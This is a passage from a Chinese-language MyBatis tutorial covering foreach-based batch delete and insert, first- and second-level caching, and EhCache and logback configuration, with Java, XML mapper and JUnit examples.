<li>foreach &#x6807;&#x7B7E;</li>
</ul>
<p>&#x52A8;&#x6001; SQL &#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x5E38;&#x89C1;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x662F;&#x5BF9;&#x96C6;&#x5408;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x6784;&#x5EFA; IN &#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x3002;</p>
<p>&#x5C5E;&#x6027; collection =&gt; &#x8BBE;&#x7F6E;&#x8981;&#x5FAA;&#x73AF;&#x7684;&#x6570;&#x7EC4;&#x6216;&#x96C6;&#x5408;&#x3002;item =&gt; &#x96C6;&#x5408;&#x6216;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x9879;&#x6570;&#x636E;&#x3002;separator =&gt; &#x8BBE;&#x7F6E;&#x5FAA;&#x73AF;&#x4F53;&#x4E4B;&#x95F4;&#x7684;&#x5206;&#x9694;&#x7B26;&#xFF0C;&#x5206;&#x9694;&#x7B26;&#x524D;&#x540E;&#x9ED8;&#x8BA4;&#x6709;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x3002;open =&gt; &#x8BBE;&#x7F6E; foreach &#x5FAA;&#x73AF;&#x7684;&#x5916;&#x90E8;&#x5F00;&#x59CB;&#x7B26;&#x3002;close =&gt; &#x8BBE;&#x7F6E; foreach &#x5FAA;&#x73AF;&#x7684;&#x5916;&#x90E8;&#x7ED3;&#x675F;&#x7B26;&#x3002;</p>
<pre><code class="language-java">public interface DynamicSQLMapper {
    // &#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#x6279;&#x91CF;&#x5220;&#x9664;
    int deleteMoreByArray(@Param(&quot;eids&quot;) Integer[] eids);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;!-- int deleteMoreByArray(@Param(&quot;eids&quot;) Integer[] eids); --&gt;
    &lt;delete id=&quot;deleteMoreByArray&quot;&gt;
        &lt;!-- &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x62EC;&#x53F7;&#x5305;&#x88F9;&#x5FAA;&#x73AF;&#x5185;&#x5BB9; --&gt;
        &lt;!-- delete from t_emp where eid in --&gt;
        &lt;!-- ( --&gt;
        &lt;!-- &lt;foreach collection=&quot;eids&quot; item=&quot;eid&quot; separator=&quot;,&quot;&gt; --&gt;
        &lt;!-- #{eid} --&gt;
        &lt;!-- &lt;/foreach&gt; --&gt;
        &lt;!-- ) --&gt;
        &lt;!-- &#x65B9;&#x5F0F;&#x4E8C; =&gt; open + close &#x4EE3;&#x66FF;&#x62EC;&#x53F7; --&gt;
        &lt;!-- delete from t_emp where eid in --&gt;
        &lt;!-- &lt;foreach collection=&quot;eids&quot; item=&quot;eid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; --&gt;
        &lt;!-- #{eid} --&gt;
        &lt;!-- &lt;/foreach&gt; --&gt;
        delete from t_emp where
        &lt;foreach collection=&quot;eids&quot; item=&quot;eid&quot; separator=&quot;or&quot;&gt;
            eid=#{eid}
        &lt;/foreach&gt;
    &lt;/delete&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class DynamicSQLMapperTest {
    @Test
    public void testDeleteMoreByArray(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        DynamicSQLMapper mapper = sqlSession.getMapper(DynamicSQLMapper.class);
        int i = mapper.deleteMoreByArray(new Integer[]{7, 8});
        System.out.println(i);
    }
}
</code></pre>
<pre><code class="language-java">public interface DynamicSQLMapper {
    // &#x96C6;&#x5408;&#x5B9E;&#x73B0;&#x6279;&#x91CF;&#x6DFB;&#x52A0;
    int insertMoreByList(@Param(&quot;emps&quot;) List&lt;Emp&gt; emps);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;!-- int insertMoreByList(@Param(&quot;emps&quot;) List&lt;Emp&gt; emps); --&gt;
    &lt;insert id=&quot;insertMoreByList&quot;&gt;
        insert into t_emp values
        &lt;foreach collection=&quot;emps&quot; item=&quot;emp&quot; separator=&quot;,&quot;&gt;
            (null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email},null)
        &lt;/foreach&gt;
    &lt;/insert&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class DynamicSQLMapperTest {
    @Test
    public void testInsertMoreByList(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        DynamicSQLMapper mapper = sqlSession.getMapper(DynamicSQLMapper.class);
        Emp emp1 = new Emp(null,&quot;test1&quot;,18,&quot;&#x7537;&quot;,&quot;test@mail.com&quot;);
        Emp emp2 = new Emp(null,&quot;test2&quot;,18,&quot;&#x5973;&quot;,&quot;test@mail.com&quot;);
        List&lt;Emp&gt; emps = Arrays.asList(emp1, emp2);
        System.out.println(mapper.insertMoreByList(emps));
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mybatis-%E7%BC%93%E5%AD%98">MyBatis &#x7F13;&#x5B58;</h2>
<h3 id="%E4%B8%80%E7%BA%A7%E7%BC%93%E5%AD%98%EF%BC%88%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%EF%BC%89">&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#xFF08;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#xFF09;</h3>
<p>&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x5C5E;&#x4E8E; SqlSession &#x7EA7;&#x522B;&#xFF0C;&#x901A;&#x8FC7;&#x540C;&#x4E00;&#x4E2A; SqlSession &#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x7F13;&#x5B58;&#xFF0C;&#x4E0B;&#x6B21;&#x67E5;&#x8BE2;&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x4F1A;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x65B0;&#x8BBF;&#x95EE;&#x3002;</p>
<p>&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x5931;&#x6548;&#x60C5;&#x51B5; =&gt; &#x4E0D;&#x540C; SqlSession &#x5BF9;&#x5E94;&#x4E0D;&#x540C;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#xFF1B;&#x540C;&#x4E00; SqlSession &#x4F46;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x4E0D;&#x540C;&#xFF1B;&#x540C;&#x4E00; SqlSession &#x4E24;&#x6B21;&#x67E5;&#x8BE2;&#x671F;&#x95F4;&#x6267;&#x884C;&#x4E86;&#x589E;&#x5220;&#x6539;&#x64CD;&#x4F5C;&#xFF1B;&#x540C;&#x4E00; SqlSession &#x4E24;&#x6B21;&#x67E5;&#x8BE2;&#x671F;&#x95F4;&#x624B;&#x52A8;&#x6E05;&#x7A7A;&#x7F13;&#x5B58;&#x3002;</p>
<pre><code class="language-java">public interface CacheMapper {
    // &#x7F13;&#x5B58;&#x53EA;&#x9488;&#x5BF9;&#x67E5;&#x8BE2;
    Emp getEmpByEid(@Param(&quot;eid&quot;) Integer eid);
    void insertEmp(Emp emp);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.CacheMapper&quot;&gt;
    &lt;!-- Emp getEmpByEid(@Param(&quot;eid&quot;) Integer eid); --&gt;
    &lt;select id=&quot;getEmpByEid&quot; resultType=&quot;Emp&quot;&gt;
        select * from t_emp where eid = #{eid}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class CacheMapperTest {
    @Test
    public void testFirstLevelCache(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        // &#x540C;&#x4E00;&#x4E2A; sqlSession &#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x7F13;&#x5B58;
        CacheMapper mapper = sqlSession.getMapper(CacheMapper.class);
        // &#x53EA;&#x4F1A;&#x8F93;&#x51FA;&#x4E00;&#x4E2A; sql &#x53D6;&#x51B3;&#x4E8E;&#x662F;&#x5426;&#x624B;&#x52A8;&#x6E05;&#x7A7A;&#x7F13;&#x5B58; sqlSession.clearCache(); or &#x589E;&#x5220;&#x6539;
        Emp emp1 = mapper.getEmpByEid(1);
        System.out.println(emp1);
//        mapper.insertEmp(new Emp(null,&quot;abc&quot;,24,&quot;&#x5973;&quot;,&quot;xc@mail.com&quot;));
//        sqlSession.clearCache();
        Emp emp2 = mapper.getEmpByEid(1);
        System.out.println(emp2);
    }
}
</code></pre>
<h3 id="%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98">&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;</h3>
<p>&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x5C5E;&#x4E8E; SqlSessionFactory &#x7EA7;&#x522B;&#xFF0C;&#x540C; SqlSessionFactory &#x521B;&#x5EFA;&#x7684; SqlSession &#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x4F1A;&#x88AB;&#x7F13;&#x5B58;&#xFF1B;&#x6B64;&#x540E;&#x82E5;&#x518D;&#x6B21;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x7ED3;&#x679C;&#x4F1A;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x83B7;&#x53D6;&#x3002;</p>
<blockquote>
<p>=&gt; <strong>&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x5F00;&#x542F;&#x7684;&#x6761;&#x4EF6;</strong><br>
&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#x5168;&#x5C40;&#x914D;&#x7F6E;&#x5C5E;&#x6027; cacheEnabled=&quot;true&quot;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A; true&#xFF09;&#xFF1B;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#x6807;&#x7B7E; <code>&lt;cache /&gt;</code>&#xFF1B;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x5FC5;&#x987B;&#x5728; SqlSession &#x5173;&#x95ED;&#x6216;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#x6709;&#x6548;&#xFF1B;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x6240;&#x8F6C;&#x6362;&#x7684;&#x5B9E;&#x4F53;&#x7C7B; pojo &#x5FC5;&#x987B;&#x5B9E;&#x73B0;&#x5E8F;&#x5217;&#x5316; Serializable &#x7684;&#x63A5;&#x53E3;&#x3002;</p>
</blockquote>
<p>&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x5931;&#x6548; =&gt; &#x4E24;&#x6B21;&#x67E5;&#x8BE2;&#x95F4;&#x6267;&#x884C;&#x4E86;&#x589E;&#x5220;&#x6539;&#xFF0C;&#x6B64;&#x65F6;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x4E00;&#x5E76;&#x5931;&#x6548;&#x3002;</p>
<pre><code class="language-java">public class Emp implements Serializable {...}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.CacheMapper&quot;&gt;
    &lt;!-- &#x5F00;&#x542F;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58; --&gt;
    &lt;cache /&gt;
    ...
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class CacheMapperTest {
    @Test
    public void testSecondLevelCache(){
        // &#x4E0D;&#x80FD;&#x4F7F;&#x7528; SqlSessionUtils.getSqlSession() &#x7684;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6E90;&#x7801;&#x4E2D;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x90FD;&#x4F1A;&#x521B;&#x5EFA;&#x65B0;&#x7684; sqlSessionFactory
        try {
            InputStream is = Resources.getResourceAsStream(&quot;mybatis-config.xml&quot;);
            SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);
            SqlSession sqlSession1 = sqlSessionFactory.openSession(true);
            CacheMapper mapper1 = sqlSession1.getMapper(CacheMapper.class);
            System.out.println(mapper1.getEmpByEid(1));
            sqlSession1.close();
            SqlSession sqlSession2 = sqlSessionFactory.openSession(true);
            CacheMapper mapper2 = sqlSession2.getMapper(CacheMapper.class);
            System.out.println(mapper2.getEmpByEid(1));
            sqlSession2.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
</code></pre>
<table>
<thead>
<tr>
<th>cache &#x6807;&#x7B7E;&#x5C5E;&#x6027;</th>
<th>&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td>eviction</td>
<td>&#x7F13;&#x5B58;&#x56DE;&#x6536;&#x7B56;&#x7565; =&gt; LRU Least Recently Used &#x6700;&#x8FD1;&#x6700;&#x5C11;&#x4F7F;&#x7528;&#x3001;FIFO First in First out &#x5148;&#x8FDB;&#x5148;&#x51FA;&#x3001;SOFT &#x8F6F;&#x5F15;&#x7528;&#x3001;WEAK &#x5F31;&#x5F15;&#x7528;</td>
</tr>
<tr>
<td>flushInterval</td>
<td>&#x5237;&#x65B0;&#x95F4;&#x9694; =&gt; &#x5355;&#x4F4D;&#x6BEB;&#x79D2; -&gt; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0D;&#x8BBE;&#xFF0C;&#x6CA1;&#x6709;&#x5237;&#x65B0;&#x95F4;&#x9694;&#xFF0C;&#x7F13;&#x5B58;&#x4EC5;&#x4EC5;&#x8C03;&#x7528;&#x8BED;&#x53E5;&#xFF08;&#x589E;&#x5220;&#x6539;&#xFF09;&#x65F6;&#x5237;&#x65B0;</td>
</tr>
<tr>
<td>size</td>
<td>&#x5F15;&#x7528;&#x6570;&#x76EE; =&gt; &#x6B63;&#x6574;&#x6570;&#x4EE3;&#x8868;&#x7F13;&#x5B58;&#x6700;&#x591A;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x591A;&#x5C11;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x592A;&#x5927;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x5185;&#x5B58;&#x6EA2;&#x51FA;</td>
</tr>
<tr>
<td>readOnly</td>
<td>&#x53EA;&#x8BFB; =&gt; true &#x7ED9;&#x6240;&#x6709;&#x8C03;&#x7528;&#x8005;&#x8FD4;&#x56DE;&#x7F13;&#x5B58;&#x5BF9;&#x8C61;&#x7684;&#x76F8;&#x540C;&#x5B9E;&#x4F8B; /false &#x4F1A;&#x8FD4;&#x56DE;&#x901A;&#x8FC7;&#x5E8F;&#x5217;&#x5316;&#x7F13;&#x5B58;&#x5BF9;&#x8C61;&#x7684;&#x62F7;&#x8D1D;&#xFF08;&#x5B89;&#x5168;&#xFF09;</td>
</tr>
</tbody>
</table>
<h3 id="%E7%BC%93%E5%AD%98%E6%9F%A5%E8%AF%A2%E9%A1%BA%E5%BA%8F">&#x7F13;&#x5B58;&#x67E5;&#x8BE2;&#x987A;&#x5E8F;</h3>
<p>&#x9996;&#x5148;&#x8FDB;&#x884C;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x67E5;&#x8BE2;&#x3002;&#x5728;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x4E2D;&#x53EF;&#x80FD;&#x5B58;&#x6709;&#x5176;&#x4ED6;&#x7A0B;&#x5E8F;&#x5DF2;&#x67E5;&#x51FA;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x65B9;&#x4FBF;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x3002;&#x5982;&#x679C;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x6CA1;&#x6709;&#x547D;&#x4E2D;&#xFF0C;&#x518D;&#x67E5;&#x8BE2;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x3002;&#x5982;&#x679C;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x4E5F;&#x6CA1;&#x6709;&#x547D;&#x4E2D;&#xFF0C;&#x5219;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x3002;SqlSession &#x5173;&#x95ED;&#x4E4B;&#x540E;&#xFF0C;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x5199;&#x5165;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x3002;&#x7531;&#x4E8E;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x9700;&#x8981;&#x5173;&#x95ED;&#x540E;&#x624D;&#x4F1A;&#x63D0;&#x4EA4;&#x7ED9;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#xFF0C;&#x90A3;&#x4E48;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x6CA1;&#x6709;&#x7684;&#x53EF;&#x80FD;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x4F1A;&#x6709;&#x3002;</p>
<h3 id="%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BC%93%E5%AD%98-ehcache">&#x7B2C;&#x4E09;&#x65B9;&#x7F13;&#x5B58; EHCache</h3>
<p>EhCache &#x662F;&#x8FDB;&#x7A0B;&#x5185;&#x7F13;&#x5B58;&#x6846;&#x67B6;&#xFF0C;&#x4E5F;&#x662F; Hibernate &#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x7F13;&#x5B58;&#x6846;&#x67B6;&#xFF0C;&#x53EF;&#x4F5C;&#x4E3A; mybatis &#x7684;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x8865;&#x5145;&#x3002;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4E00;&#x7EA7;&#x7F13;&#x5B58;&#x6CA1;&#x529E;&#x6CD5;&#x4EE3;&#x66FF;&#x3002;</p>
<ul>
<li>Maven &#x4F9D;&#x8D56;&#x5305;</li>
</ul>
<pre><code class="language-xml">&lt;!-- Mybatis EHCache &#x6574;&#x5408;&#x5305; --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.mybatis.caches&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis-ehcache&lt;/artifactId&gt;
    &lt;version&gt;1.2.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;!-- slf4j &quot;&#x6492;&#x62C9;&#x98CE;&#x8857;&quot;&#x65E5;&#x5FD7;&#x95E8;&#x9762;&#x7684;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x5B9E;&#x73B0; --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
    &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
    &lt;version&gt;1.2.3&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>ehcache.xml</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
&lt;ehcache xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:noNamespaceSchemaLocation=&quot;../config/ehcache.xsd&quot;&gt;
    &lt;!-- &#x78C1;&#x76D8;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84; =&gt; ehcache &#x7F13;&#x5B58;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x4E8E;&#x78C1;&#x76D8; --&gt;
    &lt;diskStore path=&quot;/Users/xxx/Desktop/ehcache&quot;/&gt;
    &lt;defaultCache
            maxElementsInMemory=&quot;1000&quot;
            maxElementsOnDisk=&quot;10000000&quot;
            eternal=&quot;false&quot;
            overflowToDisk=&quot;true&quot;
            timeToIdleSeconds=&quot;120&quot;
            timeToLiveSeconds=&quot;120&quot;
            diskExpiryThreadIntervalSeconds=&quot;120&quot;
            memoryStoreEvictionPolicy=&quot;LRU&quot;&gt;
    &lt;/defaultCache&gt;
&lt;/ehcache&gt;
</code></pre>
<ul>
<li>&#x8BBE;&#x7F6E;&#x4E8C;&#x7EA7;&#x7F13;&#x5B58;&#x7684;&#x7C7B;&#x578B;</li>
</ul>
<pre><code class="language-xml">&lt;!-- xxxMapper.xml --&gt;
&lt;cache type=&quot;org.mybatis.caches.ehcache.EhcacheCache&quot;/&gt;
</code></pre>
<ul>
<li>logback &#x65E5;&#x5FD7;</li>
</ul>
<p>&#x5B58;&#x5728; SLF4J &#x65F6;&#xFF0C;&#x4F5C;&#x4E3A;&#x7B80;&#x6613;&#x65E5;&#x5FD7;&#x7684; Log4j &#x5C06;&#x5931;&#x6548;&#xFF0C;&#x6B64;&#x65F6;&#x9700;&#x8981;&#x501F;&#x52A9; SLF4J &#x7684;&#x5177;&#x4F53;&#x5B9E;&#x73B0; logback &#x6765;&#x6253;&#x5370;&#x65E5;&#x5FD7;&#x3002;logback &#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x56FA;&#x5B9A;&#x540D;&#x4E3A; logback.xml&#x3002;</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;configuration debug=&quot;true&quot;&gt;
    &lt;!-- &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x7684;&#x4F4D;&#x7F6E; --&gt;
    &lt;appender name=&quot;STDOUT&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;
        &lt;encoder&gt;
            &lt;!-- &#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x7684;&#x683C;&#x5F0F; --&gt;
            &lt;!-- &#x6309;&#x7167;&#x987A;&#x5E8F;&#x5206;&#x522B;&#x662F;&#xFF1A;&#x65F6;&#x95F4;&#x3001;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#x3001;&#x7EBF;&#x7A0B;&#x540D;&#x79F0;&#x3001;&#x6253;&#x5370;&#x65E5;&#x5FD7;&#x7684;&#x7C7B;&#x3001;&#x65E5;&#x5FD7;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x3001;&#x6362;&#x884C; --&gt;
            &lt;pattern&gt;[%d{HH:mm:ss.SSS}] [%-5level] [%thread] [%logger] [%msg]%n&lt;/pattern&gt;
        &lt;/encoder&gt;
    &lt;/appender&gt;
    &lt;!-- &#x8BBE;&#x7F6E;&#x5168;&#x5C40;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#x3002;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#x6309;&#x987A;&#x5E8F;&#x5206;&#x522B;&#x662F;&#xFF1A;DEBUG&#x3001;INFO&#x3001;WARN&#x3001;ERROR --&gt;
    &lt;!-- &#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#x90FD;&#x53EA;&#x6253;&#x5370;&#x5F53;&#x524D;&#x7EA7;&#x522B;&#x548C;&#x540E;&#x9762;&#x7EA7;&#x522B;&#x7684;&#x65E5;&#x5FD7;&#x3002; --&gt;
    &lt;root level=&quot;DEBUG&quot;&gt;
        &lt;!-- &#x6307;&#x5B9A;&#x6253;&#x5370;&#x65E5;&#x5FD7;&#x7684;appender&#xFF0C;&#x8FD9;&#x91CC;&#x901A;&#x8FC7;&#x201C;STDOUT&#x201D;&#x5F15;&#x7528;&#x4E86;&#x524D;&#x9762;&#x914D;&#x7F6E;&#x7684;appender --&gt;
        &lt;appender-ref ref=&quot;STDOUT&quot; /&gt;
    &lt;/root&gt;
    &lt;!-- &#x6839;&#x636E;&#x7279;&#x6B8A;&#x9700;&#x6C42;&#x6307;&#x5B9A;&#x5C40;&#x90E8;&#x65E5;&#x5FD7;&#x7EA7;&#x522B; --&gt;
    &lt;logger name=&quot;com.xxx.crowd.mapper&quot; level=&quot;DEBUG&quot;/&gt;
&lt;/configuration&gt;
</code></pre>
<table>
<thead>
<tr>
<th>&#x5C5E;&#x6027;&#x540D;</th>
<th>&#x662F;&#x5426;&#x5FC5;&#x987B;</th>
<th>&#x4F5C;&#x7528;</th>
</tr>
</thead>
<tbody>
<tr>
<td>maxElementsInMemory</td>
<td>&#x662F;</td>
<td>&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7F13;&#x5B58;&#x7684; Element &#x7684;&#x6700;&#x5927;&#x6570;&#x76EE;</td>
</tr>
<tr>
<td>maxElementsOnDisk</td>
<td>&#x662F;</td>
<td>&#x5728;&#x78C1;&#x76D8;&#x4E0A;&#x7F13;&#x5B58;&#x7684; Element &#x7684;&#x6700;&#x5927;&#x6570;&#x76EE; =&gt; 0 &#x8868;&#x793A;&#x65E0;&#x7A77;&#x5927;</td>
</tr>
<tr>
<td>eternal</td>
<td>&#x662F;</td>
<td>&#x7F13;&#x5B58;&#x7684; Elements &#x662F;&#x5426;&#x6C38;&#x8FDC;&#x4E0D;&#x8FC7;&#x671F;&#xFF1B;true =&gt; &#x7F13;&#x5B58;&#x7684;&#x6570;&#x636E;&#x59CB;&#x7EC8;&#x6709;&#x6548;&#xFF1B;false =&gt; &#x6839;&#x636E; timeToIdleSeconds&#x3001;timeToLiveSeconds &#x5224;&#x65AD;</td>
</tr>
<tr>
<td>overflowToDisk</td>
<td>&#x662F;</td>
<td>&#x5F53;&#x5185;&#x5B58;&#x7F13;&#x5B58;&#x6EA2;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x662F;&#x5426;&#x5C06;&#x8FC7;&#x671F;&#x7684; Element &#x7F13;&#x5B58;&#x5230;&#x78C1;&#x76D8;&#x4E0A;</td>
</tr>
<tr>
<td>timeToIdleSeconds</td>
<td>&#x5426;</td>
<td>&#x5F53;&#x7F13;&#x5B58;&#x5728; EhCache &#x4E2D;&#x7684;&#x6570;&#x636E;&#x524D;&#x540E;&#x4E24;&#x6B21;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x95F4;&#x8D85;&#x8FC7; timeToIdleSeconds &#x7684;&#x5C5E;&#x6027;&#x53D6;&#x503C;&#x65F6;&#x6570;&#x636E;&#x4F1A;&#x5220;&#x9664; =&gt; &#x9ED8;&#x8BA4;&#x503C;&#x662F; 0&#xFF1B;&#x4E5F;&#x5C31;&#x662F;&#x53EF;&#x95F2;&#x7F6E;&#x65F6;&#x95F4;&#x65E0;&#x7A77;&#x5927;</td>
</tr>
<tr>
<td>timeToLiveSeconds</td>
<td>&#x5426;</td>
<td>&#x7F13;&#x5B58; Element &#x7684;&#x6709;&#x6548;&#x751F;&#x547D;&#x671F; =&gt; &#x9ED8;&#x8BA4;&#x662F; 0 -&gt; Element &#x5B58;&#x6D3B;&#x65F6;&#x95F4;&#x65E0;&#x7A77;&#x5927;</td>
</tr>
<tr>
<td>diskSpoolBufferSizeMB</td>
<td>&#x5426;</td>
<td>DiskStore &#x78C1;&#x76D8;&#x7F13;&#x5B58;&#x7684;&#x7F13;&#x5B58;&#x533A;&#x5927;&#x5C0F; =&gt; &#x9ED8;&#x8BA4;&#x662F; 30MB -&gt; &#x6BCF;&#x4E2A; Cache &#x90FD;&#x5E94;&#x8BE5;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;</td>
</tr>
<tr>
<td>diskPersistent</td>
<td>&#x5426;</td>
<td>&#x5728; VM &#x91CD;&#x542F;&#x7684;&#x65F6;&#x5019;&#x662F;&#x5426;&#x542F;&#x7528;&#x78C1;&#x76D8;&#x4FDD;&#x5B58; EhCache &#x4E2D;&#x7684;&#x6570;&#x636E; =&gt; &#x9ED8;&#x8BA4;&#x662F; false</td>
</tr>
<tr>
<td>diskExpiryThreadIntervalSeconds</td>
<td>&#x5426;</td>
<td>&#x78C1;&#x76D8;&#x7F13;&#x5B58;&#x7684;&#x6E05;&#x7406;&#x7EBF;&#x7A0B;&#x8FD0;&#x884C;&#x95F4;&#x9694;&#xFF1B;&#x9ED8;&#x8BA4;&#x662F; 120s&#x3002;&#x6BCF;&#x4E2A; 120s &#x76F8;&#x5E94;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x6B21; EhCache &#x4E2D;&#x6570;&#x636E;&#x7684;&#x6E05;&#x7406;&#x5DE5;&#x4F5C;</td>
</tr>
<tr>
<td>memoryStoreEvictionPolicy</td>
<td>&#x5426;</td>
<td>&#x5F53;&#x5185;&#x5B58;&#x7F13;&#x5B58;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x4E14;&#x53C8;&#x6709;&#x65B0;&#x7684; Element &#x52A0;&#x5165;&#x65F6;&#xFF0C;&#x79FB;&#x9664;&#x7F13;&#x5B58;&#x4E2D; Element &#x7684;&#x7B56;&#x7565;&#x3002;&#x9ED8;&#x8BA4; LRU&#xFF08;&#x6700;&#x8FD1;&#x6700;&#x5C11;&#x4F7F;&#x7528;&#xFF09;&#xFF0C;&#x53EF;&#x9009; LFU&#xFF08;&#x6700;&#x4E0D;&#x5E38;&#x4F7F;&#x7528;&#xFF09;&#x548C; FIFO&#xFF08;&#x5148;&#x8FDB;&#x5148;&#x51FA;&#xFF09;</td>
</tr>
</tbody>
